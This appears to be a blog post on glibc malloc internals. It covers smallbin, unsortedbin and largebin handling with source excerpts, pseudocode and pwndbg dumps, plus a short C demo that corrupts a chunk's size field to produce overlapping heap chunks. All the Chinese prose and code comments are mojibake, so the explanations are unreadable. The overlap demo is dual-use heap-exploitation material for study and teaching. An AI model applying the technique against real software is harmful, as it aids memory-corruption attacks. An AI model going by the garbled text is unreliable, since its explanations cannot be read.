<h4 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h4><p>å°æ–Œå¯èƒ½å»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.ä½¿ç”¨<code>malloc</code>æ—¶,å¦‚æœè½®åˆ°ä¹±æ–Œå‡ºåŠ›,å¦‚æœä¹±æ–Œå‘ç°è‡ªå·±ç®¡ç†çš„å †å—å®é™…ä¸Šæ˜¯å°æ–Œçš„èŒƒå›´,ä¹±æ–Œä¼šæ‰”ç»™å°æ–Œ</p>
<h5 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)					<span class="comment">//è‡³å°‘æœ‰ä¸€å—</span></span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))        <span class="comment">//ç±»fastbinæ£€æŸ¥DFçš„å”æ°æ–¹æ³•</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena(victim);</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE              <span class="comment">//ç±»ä¼¼äºfastbinä½¿ç”¨tcacheç¼“å†²çš„æ–¹æ³•</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena(tc_victim);</span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">                    tcache_put(tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å¦‚æœä¸è€ƒè™‘tcache,é‚£ä¹ˆç›¸åº”ä¸€æ¬¡mallocè¯·æ±‚ä¹‹å,smallbiné•¿è¿™æ ·:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213926914.png" alt="image-20241026213926914"></p>
<h3 id="ä¹±æ–ŒUnsortedbin"><a href="#ä¹±æ–ŒUnsortedbin" class="headerlink" title="ä¹±æ–ŒUnsortedbin"></a>ä¹±æ–ŒUnsortedbin</h3><h4 id="algorithm-3"><a href="#algorithm-3" class="headerlink" title="algorithm"></a>algorithm</h4><p>ä¹±æ–Œæ˜¯æ–Œå®¶çš„è¿›å£éƒ¨é•¿,å¤§æ–Œå’Œå°æ–Œçš„è´§,éƒ½æ˜¯ä¹±æ–Œç»™çš„</p>
<p>ä¹±æ–Œå¯èƒ½ä»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.å½“<code>fastbins</code>ä¸­è§¦å‘äº†<code>malloc_consolidate</code>ä¹‹å,å¦‚æœå †å—æ²¡æœ‰è¢«åˆå¹¶åˆ°<code>topchunk</code> ,é‚£ä¹ˆå…¶å½’å®¿å°±æ˜¯<code>unsortedbin</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">...</span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>2.åœ¨<code>free</code>æ—¶,å¦‚æœå †å—ä¸æ˜¯<code>mmap</code>çš„,å¹¶ä¸”<code>tcache</code>,<code>fastbins</code>éƒ½æ²¡èƒ½ç•™ä½å †å—,å¹¶ä¸”å †å—æ²¡æœ‰è¢«åˆå¹¶åˆ°<code>topchunk</code>,é‚£ä¹ˆå…¶å½’å®¿å°±æ˜¯<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))         <span class="comment">//å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);        <span class="comment">//å‘ååˆå¹¶</span></span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">      not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">      been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);      <span class="comment">//æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.åœ¨mallocæ—¶,å¦‚æœä»<code>unsorted</code>ä¸­åˆ‡å‰²äº†ä¸€ä¸ªå¤§å—æ»¡è¶³ä¸€ä¸ªå°å—çš„åˆ†é…è¯·æ±‚,é‚£ä¹ˆå‰©ä½™å—ä¼šè¢«é‡æ–°æŒ‚åˆ°<code>unsortedbin</code>ä¸­</p>
<h5 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h5><p>å¦‚æœä¸€ä¸ªå †å—è¢«<code>free</code>ä¹‹å,æ—¢æ²¡æœ‰è¢«<code>tcache</code>,<code>fastbins</code>ç•™ä½,ä¹Ÿä¸æ˜¯<code>mmap</code>æ˜ å°„å—,é‚£ä¹ˆæ­¤æ—¶è¯¥å †å—å¯èƒ½æœ‰ä¸¤ç§å½’å®¿:</p>
<p>1.ç‰©ç†ä¸Šä¸<code>topchunk</code>ç›¸é‚»,åˆå¹¶åˆ°<code>topchunk</code></p>
<p>2.ä¸ä¸<code>topchunk</code>ç›¸é‚»,æŒ‚åˆ°<code>unsortedbin</code>ä¸Š</p>
<p>[ä¸å¤ªå¯èƒ½å‘ç”Ÿçš„]å¦‚æœè¯¥å †å—è¿‡å¤§,è¶…è¿‡<code>fastbins</code>åˆå¹¶é˜ˆå€¼(64K),ä¼šè§¦å‘å †å†…å­˜ç¼©å‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))			<span class="comment">//émmapæ˜ å°„åŒº</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">// å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) <span class="comment">// å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">        bck = unsorted_chunks(av); <span class="comment">// æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">		...</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">		...</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// åˆå¹¶åˆ°topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h5 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h5><p>å½“<code>tcache</code>,<code>fastbins</code>,<code>smallbins</code>éƒ½æ²¡æœ‰æ»¡è¶³ä¸€æ¬¡åˆ†é…è¯·æ±‚,å¯èƒ½æ˜¯è¯·æ±‚å¤§å°å¤ªå¤§,æˆ–è€…å“¥ä»¨ç©·çš„å®å½“å“,åæ­£å°±æ˜¯æ²¡æ»¡è¶³</p>
<p>ä¸ºäº†åˆ©ç”¨å±€éƒ¨æ€§åŸåˆ™,<code>unsortedbin</code>ä¸­æœ‰ä¸€ä¸ªæŒ‡é’ˆ<code>last_remainder</code>,ä¹Ÿå°±æ˜¯æœ€åä¸€æ¬¡åˆ‡å‰²<code>unsortedbin</code>ä¸­å †å—åå‰©ä¸‹çš„éƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">å¤–åœˆå¾ªç¯</span><br><span class="line">	å†…åœˆå¾ªç¯éå†unsortedbin,å¯¹äºæ¯ä¸ªunsortedä¸­çš„å †å—:</span><br><span class="line">		å¦‚æœæ˜¯unsortedä¸­çš„å”¯ä¸€å †å—,å¹¶ä¸”è¯¥å—æ˜¯last_remainderå¹¶ä¸”è¿™å—è¶³å¤Ÿç›¸åº”è¯·æ±‚ åˆ™:</span><br><span class="line">			ç»§ç»­åˆ‡å®ƒ,*è¿”å›*éœ€è¦çš„,ç•™ä¸‹å¤šä½™çš„</span><br><span class="line">		å¦åˆ™å¯èƒ½æœ‰å¦‚ä¸‹æƒ…å†µ:<span class="number">1.</span>è¿™å—ä¸æ˜¯unsortedä¸­çš„å”¯ä¸€å— <span class="number">2.</span>ä¸æ˜¯last_remainder <span class="number">3.</span>ä¸å¤Ÿå¤§   æ­¤æ—¶åº”:</span><br><span class="line">			æŠŠå®ƒä»unsortedbinä¸Šæ‹†ä¸‹æ¥,ç„¶å:</span><br><span class="line">			å¦‚æœå¤§å°æ­£å¥½æ»¡è¶³è¯·æ±‚</span><br><span class="line">				å¦‚æœtcacheæœªæ»¡,åˆ™æ”¾åˆ°tcacheä¸­</span><br><span class="line">				å¦‚æœtcacheæ»¡äº†,æˆ–è€…æœªå¯ç”¨tcache,åˆ™ç›´æ¥*è¿”å›*</span><br><span class="line">			å¦åˆ™å¦‚æœå¤§å°åœ¨smallbinsèŒƒå›´å†…,åˆ™æ”¾åˆ°smallbinsä¸­</span><br><span class="line">			å¦åˆ™å¤§å°åœ¨largebinsèŒƒå›´å†…,åˆ™æ”¾åˆ°largebinsä¸­</span><br><span class="line">			å¦‚æœè¢«æ”¾åˆ°äº†tcacheä¸­,æ­¤æ—¶ä»tcacheä¸­æ‹¿ä¸€ä¸ª*è¿”å›*</span><br><span class="line">    å†…åœˆå¾ªç¯ç»“æŸ</span><br><span class="line">                </span><br><span class="line">	å¦‚æœç”³è¯·å¤§å°åœ¨largebinsèŒƒå›´,åˆ™å°è¯•ä½¿ç”¨largebinåˆ†é…</span><br><span class="line">	å¦‚æœåˆšæ‰çš„largebinæ²¡æœ‰æ»¡è¶³è¯·æ±‚,åˆ™éå†æ›´å¤§å·çš„largebinä¸­æ‰¾</span><br><span class="line">	å¦‚æœè¿˜æ²¡æ»¡è¶³,ä½¿ç”¨topchunkåˆ†é…</span><br><span class="line">	å¦‚æœè¿˜æ²¡æ»¡è¶³,ä½¿ç”¨sysmallocåˆ†é…</span><br><span class="line">                </span><br><span class="line">å¤–åœˆå¾ªç¯ç»“æŸ</span><br></pre></td></tr></table></figure>

<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><h5 id="overlap"><a href="#overlap" class="headerlink" title="overlap"></a>overlap</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *p1;</span><br><span class="line">    <span class="type">size_t</span> *p2;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">// usable(0x400) + header(0x10)</span></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);  <span class="comment">// usable(0x40) + header(0x10)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *p1_size = (<span class="type">char</span>*)p1 - <span class="number">0x8</span>;      </span><br><span class="line">    *p1_size = <span class="number">0x461</span>;       <span class="comment">//suppose off by one ... </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);			<span class="comment">//in unsortedbin</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc overlap.c -o overlap -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./overlap</span><br><span class="line">p1: 0x5600128e52a0</span><br><span class="line">p1: 0x5600128e52a0</span><br></pre></td></tr></table></figure>



<h3 id="å¤§æ–ŒLargebins"><a href="#å¤§æ–ŒLargebins" class="headerlink" title="å¤§æ–ŒLargebins"></a>å¤§æ–ŒLargebins</h3><p><code>bin_at(M,64~126) =&gt; large bins</code>è¿™ä¸ªèŒƒå›´æ˜¯largetbin,ä¸€å…±æœ‰63ä¸ªbin</p>
<p>binå†…å †å—å¤§å°ç›¸ç­‰</p>
<p>binä¹‹é—´åˆ†äº†6ç»„,ç»„å†…å„ä¸ªbinå †å—å¤§å°æˆç­‰å·®æ•°åˆ—</p>
<table>
<thead>
<tr>
<th>ç»„</th>
<th>ä¸ªæ•°</th>
<th>å…¬å·®</th>
</tr>
</thead>
<tbody><tr>
<td>bin_at(M,64~95)</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>bin_at(M,96~111)</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>bin_at(M,112~119)</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>bin_at(M,120~123)</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>bin_at(M,124~125)</td>
<td>2</td>
<td>â€¦</td>
</tr>
<tr>
<td>bin_at(M,126)</td>
<td>1</td>
<td>â€¦</td>
</tr>
</tbody></table>
<h4 id="datastructure-2"><a href="#datastructure-2" class="headerlink" title="datastructure"></a>datastructure</h4><p>å‡è®¾<code>largebins</code>çš„<code>bin_at(M,63)</code>ç›®å‰çš„çŠ¶æ€å¦‚ä¸‹:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x55555555dba0 â€”â–¸ 0x55555555dfe0 â€”â–¸ 0x55555555d340 â€”â–¸ 0x55555555d770 â€”â–¸ 0x55555555cb00 â€”â–¸ 0x55555555cf20 â€”â–¸ 0x7ffff7fa70d0 (main_arena+1104) â—‚â€” 0x55555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dba0</span><br><span class="line">0x55555555dba0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dbb0: 0x000055555555dfe0      0x00007ffff7fa70d0</span><br><span class="line">0x55555555dbc0: 0x000055555555d340      0x000055555555cb00</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dfe0</span><br><span class="line">0x55555555dfe0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dff0: 0x000055555555d340      0x000055555555dba0</span><br><span class="line">0x55555555e000: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d340</span><br><span class="line">0x55555555d340: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d350: 0x000055555555d770      0x000055555555dfe0</span><br><span class="line">0x55555555d360: 0x000055555555cb00      0x000055555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d770</span><br><span class="line">0x55555555d770: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d780: 0x000055555555cb00      0x000055555555d340</span><br><span class="line">0x55555555d790: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cb00</span><br><span class="line">0x55555555cb00: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cb10: 0x000055555555cf20      0x000055555555d770</span><br><span class="line">0x55555555cb20: 0x000055555555dba0      0x000055555555d340</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cf20</span><br><span class="line">0x55555555cf20: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cf30: 0x00007ffff7fa70d0      0x000055555555cb00</span><br><span class="line">0x55555555cf40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/2gx 0x7ffff7fa70d0+0x10</span><br><span class="line">0x7ffff7fa70e0 &lt;main_arena+1120&gt;:       0x000055555555dba0      0x000055555555cf20</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç”»åˆ°å›¾ä¸Šé•¿è¿™é€¼æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030144119554.png" alt="image-20241030144119554"></p>
<table>
<thead>
<tr>
<th>çº¿æ¡é¢œè‰²</th>
<th>æŒ‡é’ˆ</th>
</tr>
</thead>
<tbody><tr>
<td>è“</td>
<td>fd</td>
</tr>
<tr>
<td>ç»¿</td>
<td>bk</td>
</tr>
<tr>
<td>ç²‰</td>
<td>fd_nextsize</td>
</tr>
<tr>
<td>é»„</td>
<td>bk_nextsize</td>
</tr>
</tbody></table>
<p><strong>å®é™…ä¸Šlargebinå¯ä»¥çœ‹ä½œåŒå‘é“¾è¡¨, åˆåŠ ä¸Šäº†è·³è¡¨ç´¢å¼•</strong></p>
<h5 id="åŒå‘é“¾è¡¨"><a href="#åŒå‘é“¾è¡¨" class="headerlink" title="åŒå‘é“¾è¡¨"></a>åŒå‘é“¾è¡¨</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145225118.png" alt="åŒå‘é“¾è¡¨"></p>
<h5 id="è·³è¡¨ç´¢å¼•"><a href="#è·³è¡¨ç´¢å¼•" class="headerlink" title="è·³è¡¨ç´¢å¼•"></a>è·³è¡¨ç´¢å¼•</h5><p>é™„åŠ å¤´èŠ‚ç‚¹<code>bin_at(M,idx)</code>åªæœ‰<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆ,æ²¡æœ‰<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>è·³è¡¨ç´¢å¼•</p>
<p>æ‰€æœ‰å †å—é¦–å…ˆæŒ‰ç…§å¤§å°é™åºæ’åˆ—æˆåŒå‘é“¾è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x421]-&gt;[0x421]-&gt;[0x411]-&gt;[0x411]-&gt;[0x401]-&gt;[0x401]</span><br></pre></td></tr></table></figure>

<p>åªåœ¨ç›¸åŒå¤§å°çš„å †å—ç°‡çš„<strong>é¦–ä¸ªå †å—</strong>ä¸Šå»ºç«‹<strong>è·³è¡¨ç´¢å¼•</strong>,æŒ‡å‘<strong>ä¸‹ä¸€ä¸ªå¤§å°ä¸åŒçš„å †å—ç°‡</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145332777.png" alt="è·³è¡¨ç´¢å¼•"></p>
<h5 id="é“¾è¡¨-è·³è¡¨"><a href="#é“¾è¡¨-è·³è¡¨" class="headerlink" title="é“¾è¡¨+è·³è¡¨"></a>é“¾è¡¨+è·³è¡¨</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030150204350.png" alt="image-20241030150204350"></p>
<h5 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h5><p><code>binmap</code>ç”¨äºåœ¨<code>largebin</code>çš„ä¸­åŠ é€ŸæŸ¥æ‰¾æ›´å¤§çš„éç©ºçš„<code>bin</code> </p>
<p><code>binmap</code> æ˜¯<code>malloc_state</code>çš„æˆå‘˜,<code>4</code>ä¸ª<code>int</code>,å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ª<code>128</code>ä½çš„ä½å‘é‡</p>
